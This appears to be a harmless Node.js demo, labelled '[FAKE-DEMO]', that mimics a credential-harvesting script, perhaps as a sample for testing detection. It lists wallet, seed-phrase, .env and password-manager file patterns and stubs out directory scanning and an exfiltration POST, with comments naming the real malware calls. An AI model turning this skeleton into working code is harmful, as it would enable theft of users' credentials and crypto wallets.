// [FAKE-DEMO] Mimics credential harvesting script
// Scans for sensitive file patterns but only logs filenames

const fs = require('fs');
const path = require('path');

const TARGETS = ['.env', 'wallet.json', 'mnemonic.txt', 'seed_phrase.txt', 'private_key', 'keystore'];
const PASSWORD_STORES = ['KeePass', '.kdbx', '1Password', 'LastPass'];
const excludeFolders = ['node_modules', '.git', 'vendor', 'Library'];

function scanDir(dir) {
  console.log('[FAKE-DEMO] Would recursively scan:', dir);
  // Real malware: fs.readdirSync + os.walk to find all matching files
}

function exfilData(data) {
  console.log('[FAKE-DEMO] Would POST to http://127.0.0.1:9999/exfil');
  // Real malware: axios.post(C2_URL, data) or requests.post(url, files=...)
}

// [FAKE-DEMO] Scan for wallet and credential files
console.log('[FAKE-DEMO] Credential harvester initialized');
console.log('[FAKE-DEMO] Target patterns:', TARGETS);
console.log('[FAKE-DEMO] Password store patterns:', PASSWORD_STORES);
scanDir(process.env.HOME || '/tmp');
